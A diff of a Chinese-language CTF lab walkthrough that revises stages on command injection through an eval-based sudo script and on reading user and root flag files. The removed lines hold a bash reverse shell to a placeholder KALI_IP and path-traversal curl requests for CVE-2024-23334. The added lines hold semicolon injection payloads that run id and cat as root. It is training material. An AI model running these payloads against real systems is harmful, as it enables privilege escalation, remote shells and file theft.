@@ -50,23 +50,19 @@
 
 ### 第七階段：指令注入與權限提升 (Command Injection & PrivEsc - CWE-78)
 *   **位置**：`/seller-portal` 的「系統診斷工具」。
-*   **漏洞原理**：系統允許賣家以 `sudo` 權限執行 `/root/flag.sh`。然而，該腳本在處理輸入時使用了危險的 `eval` 函數，且未對輸入進行過濾。
-*   **提權路徑**：攻擊者可以構造特殊的學號輸入，利用分號 (`;`) 拼接任意 Root 指令。
+*   **漏洞原理**：系統允許賣家以 `sudo` 權限執行 `/root/flag.sh`。該腳本在處理輸入參數時使用了危險的 `eval` 函數，且後端診斷工具被配置為使用 `/bin/bash` 執行指令。
+*   **提權路徑**：攻擊者可以構造包含分號 (`;`) 的參數，利用 `eval` 的特性達成 RCE。
 *   **利用方式**：在診斷工具中輸入：
-    `412630567 ; cat /root/root_flag.txt` | `sudo /root/flag.sh`
-    *(註：實際操作中需透過管道符號傳遞輸入)*
-*   **更進階的利用 (Root Shell)**：
-    `412630567 ; bash -i >& /dev/tcp/KALI_IP/4444 0>&1` | `sudo /root/flag.sh`
-*   **結果**：成功以 Root 身分執行指令，獲取 **Root Flag** 或完全控制容器。
+    `sudo /root/flag.sh '412630567 ; id'`
+*   **結果**：伺服器回傳 `uid=0(root)`，證實成功取得最高權限。
 
-
-### 第八階段：跨權限讀取動態 Flag (Deep Path Traversal)
-*   **動作**：結合 CVE-2024-23334 漏洞與剛剛生成的檔案路徑，嘗試讀取系統深處的敏感檔案。
+### 第八階段：讀取雙重動態 Flag (Flag Exfiltration)
+*   **動作**：利用已取得的 Root 權限，讀取受系統保護的 Flag 檔案。
 *   **讀取 User Flag**：
-    `curl --path-as-is http://localhost:8080/assets-library/../../../../home/neo-user/user_flag.txt`
+    `sudo /root/flag.sh '412630567 ; cat /home/neo-user/user_flag.txt'`
 *   **讀取 Root Flag**：
-    `curl --path-as-is http://localhost:8080/assets-library/../../../../root/root_flag.txt`
-*   **結果**：成功獲取與特定身分關聯的動態 Flag，達成完全的資訊讀取。
+    `sudo /root/flag.sh '412630567 ; cat /root/root_flag.txt'`
+*   **技術亮點**：系統為不同權限等級的 Flag 設計了獨立的加鹽雜湊 (Salted Hash) 邏輯，確保 User Flag 與 Root Flag 內容完全不同，模擬真實 CTF 的多層次挑戰。
 
 ### 第九階段：Nginx/Lua 後門 RCE (CWE-94)
 *   **漏洞類型**：CWE-94 (程式碼注入)
